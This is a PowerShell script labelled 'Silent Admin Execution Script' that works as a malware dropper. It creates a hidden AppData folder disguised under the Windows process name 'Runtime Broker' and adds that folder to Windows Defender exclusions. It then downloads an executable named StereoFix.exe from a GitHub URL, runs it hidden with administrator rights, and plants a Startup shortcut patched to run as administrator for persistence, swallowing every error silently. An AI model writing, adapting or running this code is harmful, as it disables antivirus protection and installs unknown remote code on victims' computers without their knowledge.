# Silent Admin Execution Script
# Must be run from an elevated PowerShell session

# Define variables
$appUrl = "https://github.com/salamprajjit-alt/5132525231/blob/main/StereoFix.exe"
$appName = "StereoFix.exe"
$folderName = "Runtime Broker"
$basePath = "$env:APPDATA"
$folderPath = "$basePath\$folderName"
$downloadPath = "$folderPath\$appName"
$exclusionPath = $folderPath

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    # If not admin, silently exit
    exit 1
}

try {
    # Create folder if it doesn't exist
    if (-not (Test-Path $folderPath)) {
        $null = New-Item -Path $folderPath -ItemType Directory -Force
    }
    
    # Set folder as hidden
    $folder = Get-Item -Path $folderPath -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    # Add to Defender exclusions
    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
    
    # Download the executable
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($appUrl, $downloadPath)
    
    # Execute with admin privileges without prompting
    $startProcessArgs = @{
        FilePath = $downloadPath
        Verb = 'RunAs'
        WindowStyle = 'Hidden'
    }
    Start-Process @startProcessArgs
    
    # Create startup shortcut (will run with admin privileges)
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupFolder\$appName.lnk"
    $wShell = New-Object -ComObject WScript.Shell
    $shortcut = $wShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $downloadPath
    $shortcut.WorkingDirectory = $folderPath
    $shortcut.Save()
    
    # Modify shortcut to run as admin
    $bytes = [System.IO.File]::ReadAllBytes($shortcutPath)
    $bytes[0x15] = $bytes[0x15] -bor 0x20 # Set the byte that indicates "Run as Administrator"
    [System.IO.File]::WriteAllBytes($shortcutPath, $bytes)
    
} catch {
    # Silently handle any errors
    exit 1
}